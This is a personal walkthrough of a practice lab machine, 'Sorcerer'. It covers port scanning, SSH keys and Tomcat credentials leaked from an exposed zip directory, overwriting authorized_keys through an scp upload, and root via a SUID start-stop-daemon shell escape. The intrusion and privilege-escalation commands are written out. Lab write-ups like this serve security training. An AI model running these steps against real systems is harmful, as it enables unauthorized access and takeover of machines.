---
type: Lab-Machine
Status: 🟢
OS: Linux
Difficulty: Medium
IP:
Date: 2026-05-22T09:46:00
Owned: 2026-05-22T14:18:00
---

# 🖥️ Machine: [[Sorcerer]]
**List Source:** #Lainkusanagi | #TJnull 
**Target IP:** `{{value:IP_Address}}`

---
# Enumeration
## port scan

```sh
naabu -host 192.168.207.100 -p - | nerva -o allport.txt
```
![[Pasted image 20260522095650.png]]
nmap -sV
```sh
grc nmap -p80,7742,8080 192.168.207.100 -sV
```
![[Pasted image 20260522095756.png]]

## page

80
![[Pasted image 20260522095917.png]]
7742
![[Pasted image 20260522095927.png]]
8080
![[Pasted image 20260522095943.png]]

# Initial foothold

## dir enum
on port 7742
![[Pasted image 20260522100513.png]]
found the path zipfiles which has directory listing
![[Pasted image 20260522100550.png]]
look like various user zip file, let's download and check the content
![[Pasted image 20260522100727.png]]

for miriam and sofia there is the same content as francis
![[Pasted image 20260522101054.png]]

don't find anything useful for francis checking others
![[Pasted image 20260522100923.png]]
found the id_rsa for max and port 22 was open 
![[Pasted image 20260522101711.png]]

other file cred for tomcat might be usable later on port 8080
![[Pasted image 20260522101404.png]]

## ssh
use the private key to connect

connect using id_rsa
```sh
ssh -i id_rsa -p22 max@192.168.207.100
```
![[Pasted image 20260522102253.png]]
edit permission of id_rsa file
`chmod 600 id_rsa`
connect again
![[Pasted image 20260522102319.png]]
maybe need to use scp
![[Pasted image 20260522102522.png]]
scp might be able to upload file
```
scp -i id_rsa revshell.php max@192.168.207.100/path
```
earlier we tried to use the found cred on tomcat on port 8080
![[Pasted image 20260522102746.png]]
from the error page we need to add user to conf/tomcat-users.xml
![[Pasted image 20260522102917.png]]
since we're able to upload using scp let's add manager to the users.xml
we can just use the tomcat-users.xml.bak found and upload as tomcat-users.xml
to do that we would need to run this
```
scp -i id_rsa tomcat-users.xml.bak max@192.168.207.100:/conf/tomcat-users.xml
```
hmm
![[Pasted image 20260522103401.png]]
after a break found out that there is a file I ignore which is scp wrapper script

after trying to upload tomcat-users.xml for a while it didn't work

turnout we can just upload or own id_rsa.pub to replace the authorized key
first generate out own id_rsa

```
ssh-keygen -t rsa
```
![[Pasted image 20260522135344.png]]
file generated
![[Pasted image 20260522135410.png]]
edit permission
```
chmod 777 fileup.pub
```
upload to replace in the server
```
scp -i id_rsa -O fileup.pub max@192.168.207.100:/home/max/.ssh/authorized_keys
```

# Priv Esc
check for suid binary
```
find / -perm -u=s -type f 2>/dev/null
```
![[Pasted image 20260522140049.png]]
from https://gtfobins.org/gtfobins/start-stop-daemon/#shell
![[Pasted image 20260522140333.png]]
also need to check for /sh
```
which sh
```
![[Pasted image 20260522140410.png]]
edit the commad accordingly
```
#before
start-stop-daemon -S -x /usr/bin/sh -- -p
#after
/usr/sbin/start-stop-daemon -S -x /usr/bin/sh -- -p
```
done
![[Pasted image 20260522140458.png]]
got the flag
![[Pasted image 20260522140808.png]]
![[Pasted image 20260522140953.png]]
